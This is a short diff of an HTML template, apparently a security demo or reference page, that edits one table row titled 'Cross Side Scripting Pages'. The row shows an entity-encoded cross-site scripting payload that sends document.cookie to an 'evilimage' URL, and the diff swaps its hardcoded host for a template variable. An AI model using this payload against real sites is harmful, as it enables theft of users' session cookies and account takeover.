@@ -35,7 +35,7 @@
                                                     <tr>
                                                         <th scope="row">Cross Side Scripting Pages</th>
 														<td>&#x3C;script&#x3E;
-                                                        document.write(&#x27;&#x3C;img src=&#x22;https://domain.se/evilimage?get=&#x27;+escape(document.cookie)+&#x27;&#x22;&#x3E;&#x27;);
+                                                        document.write(&#x27;&#x3C;img src=&#x22;{{ domain }}evilimage?get=&#x27;+escape(document.cookie)+&#x27;&#x22;&#x3E;&#x27;);
                                                         &#x3C;/script&#x3E;</td>
                                                     </tr>
                                                     <tr>
